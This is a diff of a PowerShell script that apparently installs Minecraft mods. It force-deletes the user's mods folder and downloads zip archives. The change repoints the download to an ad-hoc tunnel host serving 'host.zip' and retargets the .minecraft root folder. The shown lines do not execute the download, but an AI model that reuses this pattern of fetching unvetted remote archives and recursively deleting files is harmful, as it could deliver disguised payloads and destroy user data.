@@ -1,6 +1,6 @@
 [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null 
-$modsFolder = "$env:APPDATA\.minecraft\mods" 
-$url = "http://pnode2.danbot.host:7105/uploads/minecraft.zip"
+$modsFolder = "$env:APPDATA\.minecraft\"
+$url = "http://special-bikini.gl.at.ply.gg:26833/host.zip"
 $tempFile = "$env:TEMP\minecraftmods.zip" 
 
 Write-Host @"
@@ -28,7 +28,7 @@ function Yes {
 	Remove-Item -Path "$env:APPDATA\.minecraft\mods\*" -Force -Recurse 
 	Write-Host "Download will take a while" -ForegroundColor Red -BackgroundColor White
 	Write-Host "Downloading Mods" -ForegroundColor Green -BackgroundColor White
-	Write-Host "Update July 30 2023" -ForegroundColor Blue -BackgroundColor White
+	Write-Host "Update February 23 2024" -ForegroundColor Blue -BackgroundColor White
 	Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
 	Invoke-WebRequest -Uri $zaeromap -OutFile $zaerotemp -UseBasicParsing
 	Invoke-WebRequest -Uri $mod1 -OutFile $modsFolder -UseBasicParsing
